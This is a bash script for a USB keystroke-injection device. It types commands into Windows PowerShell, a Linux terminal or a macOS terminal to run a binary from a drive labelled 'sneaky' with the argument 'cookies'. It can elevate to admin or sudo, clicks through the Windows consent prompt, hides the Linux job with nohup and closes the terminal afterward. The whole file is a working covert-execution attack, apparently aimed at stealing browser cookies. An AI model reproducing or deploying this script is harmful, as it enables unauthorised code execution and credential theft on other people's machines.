#!/bin/bash

cmdArgs='cookies'

function quackWindows() {

        if [ "$1" = "1" ]
        then
            # open powershell with admin rights
            Q GUI r
            Q DELAY 500
            Q STRING powershell
            Q CONTROL-SHIFT-ENTER
            Q DELAY 2000
            Q ALT j
            Q DELAY 3000
        else
            # open normal powershell (non admin)
            Q GUI r
            Q DELAY 500
            Q STRING powershell
            Q ENTER
            Q DELAY 500
        fi

        Q STRING '$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq'
        Q STRING " 'sneaky'"
        Q STRING ' } | select -expand name'
        Q ENTER
	Q STRING '.(Join-Path $usbPath'
	Q STRING " 'win.exe')"

	# add cmdargs if set
	# otherwise skip because
	# DUCKYSCRIPT has problems with empty vars to type
	# and will therefore throw an error
	if [ ! -z $cmdArgs ]
	then
		Q STRING " $cmdArgs"
	fi

	Q STRING ' ; if ($?) {'
        Q STRING ' [IO.File]::WriteAllLines((Join-Path $usbPath'
        Q STRING " 'done.txt'), 'done') ; Write-VolumeCache"
        Q STRING ' $usbPath[0] ; exit}'
        Q ENTER
        Q ESCAPE
}

function quackLinux() {

        # open terminal via search menu
        Q GUI
        Q DELAY 1500
        Q STRING "ter"

        # needed otherwise console might bug
        Q DELAY 500
        Q ENTER
        Q DELAY 2000

	# wrap cmds inside nohup
	Q STRING 'nohup sh -c "'

	if [ "$1" = "1" ]
	then
		# call bin with prepended "sudo" for root rights
		Q STRING 'sudo /media/$(users)/sneaky/lin'
	else
		# call bin without "sudo"
		Q STRING '/media/$(users)/sneaky/lin'
	fi

	# add cmdargs if set
        if [ ! -z $cmdArgs ]
        then
                Q STRING " $cmdArgs"
        fi

        # create file on path and sync (clear write cache)
        Q STRING " && sync && echo 'done' > /media/"
	Q STRING '$(users)/sneaky/done.txt && sync'

	# wrap cmds inside nohup
	Q STRING '" > /dev/null 2>&1 &'
	Q ENTER

	# close terminal
        Q DELAY 500
        Q CONTROL d
}

function quackMac() {

	# open mac terminal
        Q GUI SPACE
	Q DELAY 3000
	Q STRING "termi"
	Q DELAY 500
	Q ENTER
	Q DELAY 3000

        if [ "$1" = "1" ]
        then
                # call bin with prepended "sudo" for root rights
                Q STRING "sudo /Volumes/sneaky/mac"
        else
                # call bin without "sudo"
                Q STRING "/Volumes/sneaky/mac"
        fi

        # add cmdargs if set
        if [ ! -z $cmdArgs ]
        then
                Q STRING " $cmdArgs"
        fi

	# create file on path and sync (clear write cache)
        Q STRING " && sync && echo 'done' > /Volumes/sneaky/done.txt"
        Q STRING " && sync && pkill -a Terminal"
	Q ENTER
	Q DELAY 500
	Q GUI q
}

case $1 in

  Windows)
    quackWindows $2
    ;;

  Linux)
    quackLinux $2
    ;;

  Mac)
    quackMac $2
    ;;

esac
